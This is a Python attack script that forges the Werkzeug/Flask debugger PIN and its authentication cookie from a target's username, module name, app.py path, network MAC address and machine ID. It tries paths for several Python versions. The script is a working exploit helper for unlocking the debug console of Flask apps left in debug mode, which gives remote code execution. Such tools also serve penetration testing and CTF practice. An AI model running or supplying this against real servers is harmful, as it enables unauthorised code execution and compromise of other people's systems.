#!/usr/bin/python3

#Tested on Python3.8
#This script generates a Cookie based on a legitimate PIN code.

#If you are using a Python version lower than 3.8 and you were unable to generate a Cookie or PIN, use the script at the link below.
#It is based on the following script, which generates only the PIN code:
#https://gist.githubusercontent.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42/raw/028384ef695e376d412f9276ad27b2c916d4f748/get_flask_pin.py

#In different versions of python, the hashing algorithm may differ, in this case, sha1 is used.
#There may also be other differences.

import argparse
import os
import getpass
import sys
import hashlib
import time
import uuid
from itertools import chain

text_type = str

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

def get_pin(args):
        rv = None
        num = None
        username = args.username
        modname  = args.modname
        appname  = args.appname
        fname    = args.basefile
        probably_public_bits = [username,modname,appname,fname]
        private_bits = [args.uuid, args.machineid]
        h = hashlib.sha1()
        for bit in chain(probably_public_bits, private_bits):
                if not bit:
                        continue
                if isinstance(bit, text_type):
                        bit = bit.encode('utf-8')
                h.update(bit)
        h.update(b'cookiesalt')

        cookie_name = '__wzd' + h.hexdigest()[:20]

        # If we need to generate a pin we salt it a bit more so that we don't
        # end up with the same value and generate out 9 digits
        if num is None:
                h.update(b'pinsalt')
                num = ('%09d' % int(h.hexdigest(), 16))[:9]

        # Format the pincode in groups of digits for easier remembering if
        # we don't have a result yet.
        if rv is None:
                for group_size in 5, 4, 3:
                        if len(num) % group_size == 0:
                                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                          for x in range(0, len(num), group_size))
                                break
                else:
                        rv = num
        
        hash_pin(rv)
        print("Cookie: " ,cookie_name + "=" + str(int(time.time())) + '|' + hash_pin(rv))
        return rv

if __name__ == "__main__":
    versions = ["2.7", "3.0", "3.1", "3.2", "3.3", "3.4", "3.5", "3.6", "3.7", "3.8"]
    parser = argparse.ArgumentParser(description="tool to get the flask debug pin from system information")
    parser.add_argument("--username", required=False, default="www-data", help="The username of the user running the web server")
    parser.add_argument("--modname", required=False, default="flask.app", help="The module name (app.__module__ or app.__class__.__module__)")
    parser.add_argument("--appname", required=False, default="Flask", help="The app name (app.__name__ or app.__class__.__name__)")
    parser.add_argument("--basefile", required=False, help="The filename to the base app.py file (getattr(sys.modules.get(modname), '__file__', None))")
    parser.add_argument("--uuid", required=True, help="System network interface UUID (/sys/class/net/ens33/address or /sys/class/net/$interface/address)")
    parser.add_argument("--machineid", required=True, help="System machine ID (/etc/machine-id or /proc/sys/kernel/random/boot_id)")

    args = parser.parse_args()
    if args.basefile is None:
        print("[!] App.py base path not provided, trying for most versions of python\n")
        for v in versions:
            args.basefile = f"/usr/local/lib/python{v}/dist-packages/flask/app.py"
            print(f"PIN Python {v}: {get_pin(args)}\n")
    else:
        print("PIN: ", get_pin(args))
